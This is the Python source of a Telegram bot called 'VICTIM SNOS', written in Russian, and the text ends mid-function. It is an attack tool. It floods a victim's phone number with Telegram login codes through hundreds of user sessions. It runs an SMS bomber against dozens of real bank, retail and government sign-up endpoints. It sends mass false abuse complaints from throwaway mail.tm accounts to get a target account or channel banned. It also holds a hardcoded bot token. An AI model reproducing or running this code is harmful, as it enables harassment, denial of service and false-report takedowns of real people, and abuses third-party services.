import asyncio
import logging
import os
import random
import string
import json
import time
import aiohttp
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS = set()

MAX_SESSIONS = 600
BOMBER_DELAY = 300
TG_ATTACK_DELAY = 300

USE_MAILTM = True
MAILTM_ACCOUNTS_COUNT = 100

BANNER_PATH = "banner.png"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

active_attacks = {}
sessions_pool = []
sessions_ready = False
sessions_init_task = None

class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ComplaintState(StatesGroup):
    waiting_username = State()
    waiting_channel = State()

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)

        if user_id and user_id != ADMIN_ID and user_id not in ALLOWED_USERS:
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав!", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав!")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())

# ---------- USER-AGENTS ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
]

# ---------- САЙТЫ С АВТОРИЗАЦИЕЙ ЧЕРЕЗ TELEGRAM ----------
TELEGRAM_AUTH_SITES = [
    "https://api.fragment.com/auth",
    "https://api.getgems.io/auth/telegram",
    "https://api.tonkeeper.com/auth/telegram",
    "https://api.tonhub.com/auth/telegram",
    "https://api.hamsterkombat.com/auth/telegram",
    "https://api.notcoin.com/auth/telegram",
    "https://api.tapswap.com/auth/telegram",
    "https://api.blum.com/auth/telegram",
    "https://api.cats.com/auth/telegram",
    "https://api.yescoin.com/auth/telegram",
    "https://api.muskempire.com/auth/telegram",
    "https://api.pixelverse.com/auth/telegram",
    "https://api.bybit.com/telegram-auth",
    "https://api.htx.com/telegram-auth",
    "https://api.gate.io/telegram-auth",
    "https://api.kucoin.com/telegram-auth",
    "https://api.mexc.com/telegram-auth",
]

# ---------- САЙТЫ ДЛЯ БОМБЕРА ----------
BOMBER_WEBSITES = [
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mail.ru/oauth/token", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
    {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.signal.org/v1/accounts/sms/code/request", "method": "POST", "phone_field": "number"},
    {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.raiffeisen.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gazprombank.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
]

# ---------- MAIL.TM (ИСПРАВЛЕННЫЙ) ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except:
            pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"victim{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(
                f"{self.base_url}/accounts",
                json=account_data,
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()
                    
                    login_data = {
                        "address": account_data["address"],
                        "password": account_data["password"]
                    }
                    
                    async with self.session.post(
                        f"{self.base_url}/token",
                        json=login_data,
                        headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"],
                                "id": account_info["id"]
                            }
        except Exception as e:
            logger.error(f"Mail.tm ошибка создания: {e}")
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        logger.info(f"Создание {count} mail.tm аккаунтов...")
        
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            else:
                logger.warning(f"Не удалось создать аккаунт {i+1}")
            await asyncio.sleep(1.5)
        
        self.accounts = accounts
        self.ready = True
        logger.info(f"Создано {len(accounts)} mail.tm аккаунтов")
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            email_data = {
                "from": account["email"],
                "to": [to_email],
                "subject": subject,
                "text": body
            }
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }
            async with self.session.post(
                f"{self.base_url}/messages",
                json=email_data,
                headers=headers
            ) as resp:
                if resp.status in [200, 201, 202]:
                    logger.info(f"Email отправлен: {account['email']} -> {to_email}")
                    return True
                else:
                    logger.warning(f"Ошибка отправки: {resp.status}")
                    return False
        except Exception as e:
            logger.error(f"Ошибка отправки email: {e}")
            return False

# ---------- ИНИЦИАЛИЗАЦИЯ СЕССИЙ ----------
async def init_single_session(session_index: int) -> dict:
    """Инициализация одной сессии"""
    session_file = f"sessions/pool_{session_index}"
    try:
        client = Client(
            session_file, 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=False, 
            no_updates=True
        )
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": session_index}
    except Exception as e:
        logger.error(f"Ошибка сессии {session_index}: {e}")
        return None

async def init_sessions_batch(start_idx: int, count: int) -> list:
    """Инициализация пачки сессий"""
    tasks = []
    for i in range(start_idx, start_idx + count):
        if i < MAX_SESSIONS:
            tasks.append(init_single_session(i))
    
    results = await asyncio.gather(*tasks)
    return [r for r in results if r is not None]

async def init_sessions_background():
    """Фоновая инициализация всех сессий"""
    global sessions_pool, sessions_ready
    
    logger.info(f"Запуск инициализации {MAX_SESSIONS} сессий...")
    
    os.makedirs("sessions", exist_ok=True)
    
    batch_size = 50
    for batch_start in range(0, MAX_SESSIONS, batch_size):
        batch_sessions = await init_sessions_batch(batch_start, batch_size)
        sessions_pool.extend(batch_sessions)
        logger.info(f"Загружено {len(sessions_pool)}/{MAX_SESSIONS} сессий")
        await asyncio.sleep(1)
    
    sessions_ready = True
    logger.info(f"Инициализация сессий завершена. Всего: {len(sessions_pool)}")

async def get_available_sessions(count: int) -> list:
    """Получение доступных сессий"""
    available = []
    current_time = time.time()
    
    for session in sessions_pool:
        if not session["in_use"] and session["flood_until"] < current_time:
            session["in_use"] = True
            available.append(session)
            if len(available) >= count:
                break
    
    return available

def release_sessions(sessions: list):
    """Освобождение сессий"""
    for session in sessions:
        session["in_use"] = False

# ---------- АТАКИ ----------
async def send_tg_sms(phone: str, session: dict) -> dict:
    """Отправка SMS через Telegram сессию"""
    client = session["client"]
    try:
        if not client.is_connected:
            await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True, "session": session["index"]}
    except FloodWait as e:
        session["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False, "flood": e.value, "session": session["index"]}
    except Exception as e:
        return {"type": "SMS", "success": False, "error": str(e)[:30], "session": session["index"]}

async def send_tg_auth_request(session: aiohttp.ClientSession, phone: str, website: str) -> dict:
    """Отправка запроса на сайт с авторизацией через Telegram"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    
    payload = {
        'phone': phone,
        'phone_number': phone,
    }
    
    try:
        async with session.post(website, headers=headers, json=payload, timeout=5, ssl=False) as resp:
            return {"site": website.split('/')[2], "success": True, "status": resp.status}
    except:
        return {"site": website.split('/')[2], "success": False}

async def send_bomber_request(session: aiohttp.ClientSession, phone: str, website: dict) -> dict:
    """Отправка запроса на сайт бомбера"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    
    payload = {website["phone_field"]: phone}
    
    try:
        if website["method"] == "POST":
            async with session.post(website["url"], headers=headers, json=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True}
        else:
            async with session.get(website["url"], headers=headers, params=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True}
    except:
        return {"site": website["url"].split('/')[2], "success": False}

async def tg_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    """Атака на Telegram авторизацию"""
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            available = await get_available_sessions(min(100, len(sessions_pool)))
            
            if not available:
                logger.warning("Нет доступных сессий")
                await asyncio.sleep(5)
                continue
            
            tasks = []
            
            # Запросы на сайты
            for website in TELEGRAM_AUTH_SITES:
                for _ in range(2):
                    tasks.append(send_tg_auth_request(session, phone, website))
            
            # SMS через сессии
            for sess in available:
                tasks.append(send_tg_sms(phone, sess))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_sessions(available)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            logger.info(f"TG раунд {rnd}/{rounds}: OK={successful} ERR={failed}")
            await asyncio.sleep(TG_ATTACK_DELAY)
    
    return results, successful, failed

async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    """Бомбер атака"""
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            for website in BOMBER_WEBSITES:
                for _ in range(2):
                    tasks.append(send_bomber_request(session, phone, website))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            logger.info(f"Бомбер раунд {rnd}/{rounds}: OK={successful} ERR={failed}")
            await asyncio.sleep(BOMBER_DELAY)
    
    return results, successful, failed

# ---------- ОТЧЕТЫ ----------
def generate_tg_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ СНОСА TELEGRAM",
        "=" * 50,
        f"Пользователь: {username}",
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Успешно: {successful}",
        f"Ошибок: {failed}",
        "=" * 50,
        ""
    ]
    
    # Статистика по сайтам
    site_stats = {}
    sms_success = 0
    sms_failed = 0
    
    for r in results:
        if r.get('type') == 'SMS':
            if r.get('success'):
                sms_success += 1
            else:
                sms_failed += 1
        else:
            site = r.get('site', 'Unknown')
            if site not in site_stats:
                site_stats[site] = {"ok": 0, "err": 0}
            if r.get('success'):
                site_stats[site]["ok"] += 1
            else:
                site_stats[site]["err"] += 1
    
    lines.append(f"SMS: OK={sms_success} ERR={sms_failed}")
    lines.append("")
    
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
    
    return "\n".join(lines)

def generate_bomber_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ БОМБЕРА",
        "=" * 50,
        f"Пользователь: {username}",
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Сайтов: {len(BOMBER_WEBSITES)}",
        f"Успешно: {successful}",
        f"Ошибок: {failed}",
        "=" * 50,
        ""
    ]
    
    site_stats = {}
    for r in results:
        site = r.get('site', 'Unknown')
        if site not in site_stats:
            site_stats[site] = {"ok": 0, "err": 0}
        if r.get('success'):
            site_stats[site]["ok"] += 1
        else:
            site_stats[site]["err"] += 1
    
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
    
    return "\n".join(lines)

# ---------- ЖАЛОБЫ (ИСПРАВЛЕННЫЕ) ----------
async def send_mass_complaint_account(mail_tm: MailTM, username: str) -> int:
    """Отправка жалоб на аккаунт"""
    if not mail_tm.ready or not mail_tm.accounts:
        logger.error("Mail.tm не готов")
        return 0
    
    receivers = [
        'sms@telegram.org',
        'dmca@telegram.org',
        'abuse@telegram.org',
        'support@telegram.org',
        'security@telegram.org'
    ]
    
    body = f"""Здравствуйте, поддержка Telegram!

Прошу проверить аккаунт @{username} на предмет нарушения правил платформы.
Данный аккаунт используется для рассылки спама и мошеннических действий.

Пожалуйста, примите меры.

С уважением,
Пользователь Telegram"""

    subject = f"Жалоба на аккаунт @{username}"
    
    sent = 0
    semaphore = asyncio.Semaphore(10)
    
    async def send_one(account, receiver):
        async with semaphore:
            result = await mail_tm.send_email(account, receiver, subject, body)
            await asyncio.sleep(1)
            return result
    
    tasks = []
    for account in mail_tm.accounts[:30]:
        for receiver in receivers[:3]:
            tasks.append(send_one(account, receiver))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    
    logger.info(f"Жалобы на аккаунт: отправлено {sent} писем")
    return sent

async def send_mass_complaint_channel(mail_tm: MailTM, channel: str) -> int:
    """Отправка жалоб на канал"""
    if not mail_tm.ready or not mail_tm.accounts:
        logger.error("Mail.tm не готов")
        return 0
    
    receivers = [
        'sms@telegram.org',
        'dmca@telegram.org',
        'abuse@telegram.org',
        'support@telegram.org',
        'security@telegram.org'
    ]
    
    body = f"""Здравствуйте, поддержка Telegram!

Прошу проверить канал {channel} на предмет нарушения правил платформы.
В данном канале распространяется запрещенный контент.

Пожалуйста, примите меры.

С уважением,
Пользователь Telegram"""

    subject = f"Жалоба на канал {channel}"
    
    sent = 0
    semaphore = asyncio.Semaphore(10)
    
    async def send_one(account, receiver):
        async with semaphore:
            result = await mail_tm.send_email(account, receiver, subject, body)
            await asyncio.sleep(1)
            return result
    
    tasks = []
    for account in mail_tm.accounts[:30]:
        for receiver in receivers[:3]:
            tasks.append(send_one(account, receiver))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    
    logger.info(f"Жалобы на канал: отправлено {sent} писем")
    return sent

# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС TELEGRAM", callback_data="tg_attack")
    builder.button(text="SMS БОМБЕР", callback_data="bomber_attack")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop_attack")
    builder.adjust(1)
    return builder.as_markup()

# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    status_text = "Готов" if sessions_ready else f"Загрузка ({len(sessions_pool)}/{MAX_SESSIONS})"
    mail_status = "Готов" if (mail_tm.ready and mail_tm.accounts) else "Загрузка"
    
    caption = (
        "<b>VICTIM SNOS v3.0</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} ({status_text})\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({mail_status})\n"
        f"Сайтов TG: {len(TELEGRAM_AUTH_SITES)}\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n\n"
        "Выберите действие:"
    )
    
    if os.path.exists(BANNER_PATH):
        await message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=get_main_menu()
        )
    else:
        await message.answer(caption, reply_markup=get_main_menu())

@dp.callback_query(F.data == "main_menu")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    
    status_text = "Готов" if sessions_ready else f"Загрузка ({len(sessions_pool)}/{MAX_SESSIONS})"
    mail_status = "Готов" if (mail_tm.ready and mail_tm.accounts) else "Загрузка"
    
    caption = (
        "<b>VICTIM SNOS - Главное меню</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} ({status_text})\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} ({mail_status})"
    )
    
    if os.path.exists(BANNER_PATH):
        await callback.message.delete()
        await callback.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=get_main_menu()
        )
    else:
        await callback.message.edit_text(caption, reply_markup=get_main_menu())
    
    await callback.answer()

@dp.callback_query(F.data == "status")
async def status(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "<b>СТАТУС</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS}\n"
        f"Готовность сессий: {'Да' if sessions_ready else 'Нет'}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"Готовность почты: {'Да' if mail_tm.ready else 'Нет'}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "tg_attack")
async def tg_attack_start(callback: types.CallbackQuery, state: FSMContext):
    if not sessions_ready or len(sessions_pool) == 0:
        await callback.answer("Сессии еще загружаются!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_phone)
    await callback.message.edit_text(
        "<b>СНОС TELEGRAM</b>\n\n"
        "Введите номер телефона:\n"
        "Формат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "bomber_attack")
async def bomber_attack_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(BomberState.waiting_phone)
    await callback.message.edit_text(
        f"<b>SMS БОМБЕР</b>\n\n"
        f"Сайтов: {len(BOMBER_WEBSITES)}\n\n"
        "Введите номер телефона:\n"
        "Формат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.message(StateFilter(AttackState.waiting_phone))
async def tg_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")

@dp.message(StateFilter(AttackState.waiting_count))
async def tg_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 5:
            await message.answer("Введите число от 1 до 5!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    username = f"{message.from_user.id}"
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>СНОС TELEGRAM ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>СНОС TELEGRAM</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await tg_attack(phone, count, update_progress)
    report = generate_tg_report(username, phone, results, successful, failed)
    
    filename = f"tg_snos_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    
    await status_msg.delete()
    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 5:
            await message.answer("Введите число от 1 до 5!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    username = f"{message.from_user.id}"
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nСайтов: {len(BOMBER_WEBSITES)}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>БОМБЕР</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await bomber_attack(phone, count, update_progress)
    report = generate_bomber_report(username, phone, results, successful, failed)
    
    filename = f"bomber_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    
    await status_msg.delete()
    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())

@dp.callback_query(F.data == "complaint_account")
async def complaint_account(callback: types.CallbackQuery, state: FSMContext):
    if not mail_tm.ready or not mail_tm.accounts:
        await callback.answer("Почта еще загружается!", show_alert=True)
        return
    
    await state.set_state(ComplaintState.waiting_username)
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "complaint_channel")
async def complaint_channel(callback: types.CallbackQuery, state: FSMContext):
    if not mail_tm.ready or not mail_tm.accounts:
        await callback.answer("Почта еще загружается!", show_alert=True)
        return
    
    await state.set_state(ComplaintState.waiting_channel)
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.message(StateFilter(ComplaintState.waiting_username))
async def process_complaint_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.clear()
    
    status_msg = await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint_account(mail_tm, username)
    
    await status_msg.delete()
    await message.answer(
        f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nОтправлено писем: {sent}",
        reply_markup=get_main_menu()
    )

@dp.message(StateFilter(ComplaintState.waiting_channel))
async def process_complaint_channel(message: types.Message, state: FSMContext):
    channel = message.text.strip()
    await state.clear()
    
